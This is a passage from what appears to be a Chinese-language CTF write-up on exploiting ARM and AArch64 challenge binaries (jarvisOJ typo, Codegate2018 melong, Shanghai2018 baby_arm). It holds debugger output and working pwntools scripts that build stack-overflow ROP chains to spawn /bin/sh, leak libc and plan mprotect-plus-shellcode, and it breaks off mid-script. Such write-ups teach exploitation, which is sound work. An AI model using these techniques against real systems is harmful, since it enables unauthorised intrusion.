LEGEND: STACK <span class="p">|</span> HEAP <span class="p">|</span> CODE <span class="p">|</span> DATA <span class="p">|</span> RWX <span class="p">|</span> RODATA
──────────────────────────────────────────────────<span class="o">[</span> REGISTERS <span class="o">]</span>──────────────────────────────────────────────────
 R0   0x0
 R1   0xfffef024 ◂— 0x61616161 <span class="o">(</span><span class="s1">&#39;aaaa&#39;</span><span class="o">)</span>
 R2   0x7e
 R3   0x0
 R4   0x62616162 <span class="o">(</span><span class="s1">&#39;baab&#39;</span><span class="o">)</span>
 R5   0x0
 R6   0x0
 R7   0x0
 R8   0x0
 R9   0xa5ec ◂— push   <span class="o">{</span>r3, r4, r5, r6, r7, r8, sb, lr<span class="o">}</span>
 R10  0xa68c ◂— push   <span class="o">{</span>r3, r4, r5, lr<span class="o">}</span>
 R11  0x62616163 <span class="o">(</span><span class="s1">&#39;caab&#39;</span><span class="o">)</span>
 R12  0x0
 SP   0xfffef098 ◂— 0x62616165 <span class="o">(</span><span class="s1">&#39;eaab&#39;</span><span class="o">)</span>
 PC   0x62616164 <span class="o">(</span><span class="s1">&#39;daab&#39;</span><span class="o">)</span>
───────────────────────────────────────────────────<span class="o">[</span> DISASM <span class="o">]</span>────────────────────────────────────────────────────
Invalid address 0x62616164










────────────────────────────────────────────────────<span class="o">[</span> STACK <span class="o">]</span>────────────────────────────────────────────────────
00:0000│ sp  0xfffef098 ◂— 0x62616165 <span class="o">(</span><span class="s1">&#39;eaab&#39;</span><span class="o">)</span>
01:0004│     0xfffef09c ◂— 0x62616166 <span class="o">(</span><span class="s1">&#39;faab&#39;</span><span class="o">)</span>
02:0008│     0xfffef0a0 ◂— 0x62616167 <span class="o">(</span><span class="s1">&#39;gaab&#39;</span><span class="o">)</span>
03:000c│     0xfffef0a4 ◂— 0x62616168 <span class="o">(</span><span class="s1">&#39;haab&#39;</span><span class="o">)</span>
04:0010│     0xfffef0a8 ◂— 0x62616169 <span class="o">(</span><span class="s1">&#39;iaab&#39;</span><span class="o">)</span>
05:0014│     0xfffef0ac ◂— 0x6261616a <span class="o">(</span><span class="s1">&#39;jaab&#39;</span><span class="o">)</span>
06:0018│     0xfffef0b0 ◂— 0x6261616b <span class="o">(</span><span class="s1">&#39;kaab&#39;</span><span class="o">)</span>
07:001c│     0xfffef0b4 ◂— 0x6261616c <span class="o">(</span><span class="s1">&#39;laab&#39;</span><span class="o">)</span>
Program received signal SIGSEGV
pwndbg&gt; cyclic -l 0x62616164
<span class="m">112</span>
</code></pre></td></tr></table>
</div>
</div><hr>
<p>或者可以直接爆破 padding 长度</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">pdb</span>
<span class="c1">#  context.log_level = &#34;debug&#34;</span>

<span class="c1">#  for i in range(100, 150)[::-1]:</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">112</span><span class="p">,</span> <span class="mi">113</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;l&#34;</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./typo&#34;</span><span class="p">,</span> <span class="n">timeout</span> <span class="o">=</span> <span class="mi">2</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;d&#34;</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&#34;qemu-arm&#34;</span><span class="p">,</span> <span class="s2">&#34;-g&#34;</span><span class="p">,</span> <span class="s2">&#34;1234&#34;</span><span class="p">,</span> <span class="s2">&#34;./typo&#34;</span><span class="p">])</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn2.jarvisoj.com&#34;</span><span class="p">,</span> <span class="mi">9888</span><span class="p">,</span> <span class="n">timeout</span> <span class="o">=</span> <span class="mi">2</span><span class="p">)</span>
    
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;quit</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
    
    <span class="s1">&#39;&#39;&#39;
</span><span class="s1">    jarvisOJ_typo [master●●] ROPgadget --binary ./typo --string /bin/sh
</span><span class="s1">    Strings information
</span><span class="s1">    ============================================================
</span><span class="s1">    0x0006c384 : /bin/sh
</span><span class="s1">    jarvisOJ_typo [master●●] ROPgadget --binary ./typo --only &#34;pop|ret&#34; | grep r0
</span><span class="s1">    0x00020904 : pop {r0, r4, pc}
</span><span class="s1">    &#39;&#39;&#39;</span>
    
    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x20904</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x6c384</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x110B4</span><span class="p">)</span>
    <span class="n">success</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

    <span class="c1">#  pause()</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="c1">#  pdb.set_trace()</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;echo aaaa&#34;</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;aaaa&#34;</span><span class="p">,</span> <span class="n">timeout</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span>
    <span class="k">except</span> <span class="ne">EOFError</span><span class="p">:</span>
        <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">continue</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="codegate2018---melong">Codegate2018 - melong</h2>
<p><a href="https://github.com/bash-c/pwn_repo/tree/master/Codegate2018_Melong">题目和脚本链接</a></p>
<h3 id="静态分析-1">静态分析</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">melong: ELF 32-bit LSB executable, ARM, EABI5 version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux.so.3, <span class="k">for</span> GNU/Linux 3.2.0, BuildID<span class="o">[</span>sha1<span class="o">]=</span>2c55e75a072020303e7c802d32a5b82432f329e9, not stripped
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/m4x/pwn_repo/Codegate2018_Melong/melong&#39;</span>
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
</code></pre></td></tr></table>
</div>
</div><h3 id="思路分析">思路分析</h3>
<p>程序逻辑很简单, 就不写分析过程了, 漏洞很好找, write_diary 中 read 的长度是由我们输入的, 可以栈溢出, 先进入 PT 函数, 输入 -1, 再进入 write_diary, 就可以实现 arbitrary overflow 了, 因此思路同 x64 下的 rop 相同, 先 leak 出 libc 基址, 然后控制执行 system(&quot;/bin/sh&quot;) 即可</p>
<p><strong>比赛时这道题目并没有给 libc 文件, 为了简化演示过程, 我直接用了我本地的 libc</strong></p>
<h3 id="exp">exp</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&#34;./melong&#34;</span>

<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;r&#34;</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;localhost&#34;</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>
<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;l&#34;</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&#34;qemu-arm&#34;</span><span class="p">,</span> <span class="s2">&#34;-L&#34;</span><span class="p">,</span> <span class="s2">&#34;./&#34;</span><span class="p">,</span> <span class="s2">&#34;./melong&#34;</span><span class="p">])</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&#34;qemu-arm&#34;</span><span class="p">,</span> <span class="s2">&#34;-g&#34;</span><span class="p">,</span> <span class="s2">&#34;1234&#34;</span><span class="p">,</span> <span class="s2">&#34;-L&#34;</span><span class="p">,</span> <span class="s2">&#34;./&#34;</span><span class="p">,</span> <span class="s2">&#34;./melong&#34;</span><span class="p">])</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./melong&#34;</span><span class="p">,</span> <span class="n">checksec</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./lib/libc.so.6&#34;</span><span class="p">,</span> <span class="n">checksec</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span>

<span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="n">height</span><span class="p">,</span> <span class="n">weight</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; : &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">height</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; : &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">weight</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">PT</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">write_diray</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;4&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;6&#34;</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
    <span class="n">check</span><span class="p">(</span><span class="mf">1.82</span><span class="p">,</span> <span class="mi">60</span><span class="p">)</span>
    <span class="n">PT</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="s1">&#39;&#39;&#39;
</span><span class="s1">    0x00011bbc : pop {r0, pc}
</span><span class="s1">    &#39;&#39;&#39;</span>
    <span class="n">pr0</span> <span class="o">=</span> <span class="mh">0x00011bbc</span>
    <span class="n">leak</span>  <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0x54</span><span class="p">),</span> <span class="n">pr0</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">],</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span>
    <span class="s1">&#39;&#39;&#39;
</span><span class="s1">    pwndbg&gt; x/i $pc
</span><span class="s1">    =&gt; 0xff6a7a48 &lt;puts+400&gt;:	pop	{r4, r5, r6, r7, r8, r9, r10, pc}
</span><span class="s1">    &#39;&#39;&#39;</span>
    <span class="n">leak</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">])</span> <span class="o">*</span> <span class="mi">8</span>
    <span class="n">write_diray</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
    <span class="n">logout</span><span class="p">()</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;See you again :)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
    <span class="n">success</span><span class="p">(</span><span class="s2">&#34;libc.address -&gt; {:#x}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
    <span class="c1">#  raw_input(&#34;DEBUG: &#34;)</span>

    <span class="n">check</span><span class="p">(</span><span class="mf">1.82</span><span class="p">,</span> <span class="mi">60</span><span class="p">)</span>
    <span class="n">PT</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">rop</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x54</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pr0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)))</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span>
    <span class="n">write_diray</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
    <span class="n">logout</span><span class="p">()</span>

    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="shanghai2018---baby_arm">Shanghai2018 - baby_arm</h2>
<p><a href="https://github.com/bash-c/pwn_repo/tree/master/Shanghai2018_baby_arm">binary &amp; exploit here</a></p>
<h3 id="静态分析-2">静态分析</h3>
<p>题目给了一个 <code>aarch64</code> 架构的文件，没有开 canary 保护</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">Shanghai2018_baby_arm <span class="o">[</span>master<span class="o">]</span> check ./pwn 
+ file ./pwn
./pwn: ELF 64-bit LSB executable, ARM aarch64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, <span class="k">for</span> GNU/Linux 3.7.0, BuildID<span class="o">[</span>sha1<span class="o">]=</span>e988eaee79fd41139699d813eac0c375dbddba43, stripped
+ checksec ./pwn
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/m4x/pwn_repo/Shanghai2018_baby_arm/pwn&#39;</span>
    Arch:     aarch64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><p>看一下程序逻辑</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="kr">__int64</span> <span class="nf">main_logic</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">Init</span><span class="p">();</span>
  <span class="n">write</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="s">&#34;Name:&#34;</span><span class="p">,</span> <span class="mi">5LL</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="n">input</span><span class="p">,</span> <span class="mi">512LL</span><span class="p">);</span>
  <span class="n">sub_4007F0</span><span class="p">();</span>
  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">sub_4007F0</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kr">__int64</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// [xsp+10h] [xbp+10h]
</span><span class="c1"></span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v0</span><span class="p">,</span> <span class="mi">512LL</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>程序的主干读取了 512 个字符到一个全局变量上，而在 <code>sub_4007F0()</code> 中，又读取了 512 个字节到栈上，需要注意的是这里直接从 <code>frame pointer + 0x10</code> 开始读取，因此即使开了 canary 保护也无所谓。</p>
<h3 id="思路-1">思路</h3>
<p>理一下思路，可以直接 rop，但我们不知道远程的 libc 版本，同时也发现程序中有调用 <code>mprotect</code> 的代码段</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">.text:00000000004007C8                 STP             X29, X30, [SP,#-0x10]!
.text:00000000004007CC                 MOV             X29, SP
.text:00000000004007D0                 MOV             W2, #0
.text:00000000004007D4                 MOV             X1, #0x1000
.text:00000000004007D8                 MOV             X0, #0x1000
.text:00000000004007DC                 MOVK            X0, #0x41,LSL#16
.text:00000000004007E0                 BL              .mprotect
.text:00000000004007E4                 NOP
.text:00000000004007E8                 LDP             X29, X30, [SP],#0x10
.text:00000000004007EC                 RET
</code></pre></td></tr></table>
</div>
</div><p>但这段代码把 <code>mprotect</code> 的权限位设成了 0，没有可执行权限，这就需要我们通过 rop 控制 <code>mprotect</code> 设置如 bss 段等的权限为可写可执行</p>
<p>因此可以有如下思路：</p>
<ol>
<li>第一次输入 name 时，在 bss 段写上 shellcode</li>
<li>通过 rop 调用 mprotect 改变 bss 的权限</li>
<li>返回到 bss 上的 shellcode</li>
</ol>
<p><code>mprotect</code> 需要控制三个参数，可以考虑使用 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium_rop/#ret2csu">ret2csu</a> 这种方法，可以找到如下的 gadgets 来控制 <code>x0, x1, x2</code> 寄存器</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]
.text:00000000004008B0                 MOV             X2, X22
.text:00000000004008B4                 MOV             X1, X23
.text:00000000004008B8                 MOV             W0, W24
.text:00000000004008BC                 ADD             X19, X19, #1
.text:00000000004008C0                 BLR             X3
.text:00000000004008C4                 CMP             X19, X20
.text:00000000004008C8                 B.NE            loc_4008AC
.text:00000000004008CC
.text:00000000004008CC loc_4008CC                              ; CODE XREF: sub_400868+3C↑j
.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]
.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]
.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]
.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40
.text:00000000004008DC                 RET
</code></pre></td></tr></table>
</div>
</div><p>最终的 <a href="https://github.com/bash-c/pwn_repo/blob/master/Shanghai2018_baby_arm/solve.py">exp</a> 如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&#34;./pwn&#34;</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span>

<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;l&#34;</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&#34;qemu-aarch64&#34;</span><span class="p">,</span> <span class="s2">&#34;-L&#34;</span><span class="p">,</span> <span class="s2">&#34;/usr/aarch64-linux-gnu&#34;</span><span class="p">,</span> <span class="s2">&#34;./pwn&#34;</span><span class="p">])</span>
<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;d&#34;</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&#34;qemu-aarch64&#34;</span><span class="p">,</span> <span class="s2">&#34;-g&#34;</span><span class="p">,</span> <span class="s2">&#34;1234&#34;</span><span class="p">,</span> <span class="s2">&#34;-L&#34;</span><span class="p">,</span> <span class="s2">&#34;/usr/aarch64-linux-gnu&#34;</span><span class="p">,</span> <span class="s2">&#34;./pwn&#34;</span><span class="p">])</span>
<span class="k">else</span><span class="p">:</span>
